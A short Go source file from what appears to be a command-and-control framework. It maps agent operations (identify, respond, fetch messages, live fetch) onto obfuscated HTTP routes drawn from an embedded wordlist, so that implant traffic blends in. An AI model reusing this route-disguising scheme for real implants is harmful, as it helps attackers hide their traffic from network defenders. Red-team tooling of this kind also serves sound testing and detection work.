package c2api

import (
	_ "embed"
	"strings"
)

//go:embed routes.txt
var RawRoutesDoc string

const R_AGENT_IDENTIFY = 0
const R_MESSAGE_RESPOND = 1
const R_FETCH_MESSAGES = 3
const R_FETCH_MESSAGES_LIVE = 4

var RouteMap map[int][]string = func() (rMap map[int][]string) {
	registeredObfuscatedRoutes := []int{
		R_AGENT_IDENTIFY, R_FETCH_MESSAGES, R_MESSAGE_RESPOND,
		R_FETCH_MESSAGES_LIVE,
	}

	rMap = make(map[int][]string, len(registeredObfuscatedRoutes))

	wlChunks := chunkSlice(strings.Split(RawRoutesDoc, "\n"), len(registeredObfuscatedRoutes))

	for chunkIndex, chunk := range wlChunks {
		rMap[registeredObfuscatedRoutes[chunkIndex]] = chunk
	}

	return rMap
}()
